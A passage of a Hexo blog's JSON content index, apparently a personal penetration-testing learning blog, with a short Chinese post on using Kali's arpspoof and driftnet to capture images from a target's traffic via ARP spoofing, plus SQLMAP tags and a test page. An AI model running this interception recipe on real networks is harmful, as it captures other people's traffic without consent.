&quot;数据库名&quot;","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"},{"name":"SQLMAP","slug":"SQLMAP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/SQLMAP/"},{"name":"数据库注入","slug":"数据库注入","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/数据库注入/"}]},{"title":"Kali ARP欺骗抓取图片","slug":"Kali-ARP欺骗抓取图片","date":"2019-01-13T21:36:43.000Z","updated":"2019-01-13T21:44:33.166Z","comments":true,"path":"2019/01/14/Kali-ARP欺骗抓取图片/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Kali-ARP欺骗抓取图片/","excerpt":"","text":"如何使用ARP欺骗获取网卡上流过的图片 1.设置网卡 echo 1 &gt;proc/sys/net/ipv4/ip_forward 这种情况下不会出现断网现象，使目标IP的流量经过我的网卡，然后再转发出去，目标IP任然能接受到流量，不会产生影响，但实际上流量先经过了你的网卡 2.发动arp欺骗 arpspoof -i 网卡 -t 目标IP 网关 3.检测流过网卡的图片流量 driftnet -i eth0","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"ARP欺骗","slug":"ARP欺骗","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ARP欺骗/"},{"name":"arpspoof","slug":"arpspoof","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/arpspoof/"},{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"},{"name":"图片","slug":"图片","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/图片/"},{"name":"driftnet","slug":"driftnet","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/driftnet/"}]},{"title":"Hello_Github","slug":"Hello-Github","date":"2019-01-13T04:32:35.000Z","updated":"2019-01-13T04:33:29.366Z","comments":true,"path":"2019/01/13/Hello-Github/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/13/Hello-Github/","excerpt":"","text":"This is a test page","categories":[],"tags":[]}]}